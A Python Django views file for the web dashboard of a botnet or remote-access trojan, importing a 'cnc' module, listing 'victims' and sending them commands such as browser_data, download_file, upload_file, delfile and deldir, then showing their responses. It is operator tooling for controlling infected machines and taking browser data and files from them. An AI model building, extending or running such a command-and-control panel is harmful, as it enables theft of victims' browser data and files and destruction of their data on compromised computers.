from django.shortcuts import render
from django.http import HttpResponse,HttpResponseRedirect
from web.cnc import Api
from web import structs
# Create your views here.
def home(response):
    victims = Api.get_all_victims() # {Status:bool,data:[VICTIM}
    print(victims)
    if victims["Status"]:
        data = {"victims":victims["data"]}
    return render(response,"landing/landing.html",data)

def control(response,id:int):
    commands = ["browser_data","info","back","ls","walk","upload_file","mkfile","mkdir","deldir","delfile","download_file"]
    victim = Api.get_victim_by_id(id)

    if response.method == "POST":
        command=response.POST["command"]
        params =response.POST["parameters"]
        d = Api.new_command(command=str(command),target=str(victim["data"][0].name),parameter=params)
        if victim["Status"]:
            data = {"victim":victim["data"][0],"commands":commands,"command_sent":bool(d)}
    else:
        if victim["Status"]:
            responses = Api.get_response(id=id)
            print(responses["data"])
            data = {"victim":victim["data"][0],"commands":commands,"responses":responses["data"]}
    return render(response,"landing/control.html",data)

